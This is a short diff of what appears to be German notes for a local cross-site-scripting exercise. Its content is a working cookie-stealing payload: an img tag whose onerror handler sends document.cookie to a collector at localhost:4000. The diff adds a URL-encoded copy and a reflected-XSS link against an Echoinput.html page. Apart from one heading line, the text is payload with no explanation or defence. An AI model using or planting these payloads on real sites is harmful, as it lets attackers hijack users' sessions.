@@ -11,3 +11,8 @@ User schickt direkt den Cookie:
 
 BIO:
 <img src= "keinbild"onerror="javascript:window.location='http://localhost:4000/xss?cookie=' + encodeURIComponent(document.cookie);"></img>
+
+%3Cimg+src%3D+%22keinbild%22onerror%3D%22javascript%3Awindow.location%3D%27http%3A%2F%2Flocalhost%3A4000%2Fxss%3Fcookie%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B%22%3E%3C%2Fimg%3E
+
+
+http://localhost:3000/Echoinput.html?input=%3Cimg+src%3D+%22keinbild%22onerror%3D%22javascript%3Awindow.location%3D%27http%3A%2F%2Flocalhost%3A4000%2Fxss%3Fcookie%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B%22%3E%3C%2Fimg%3E
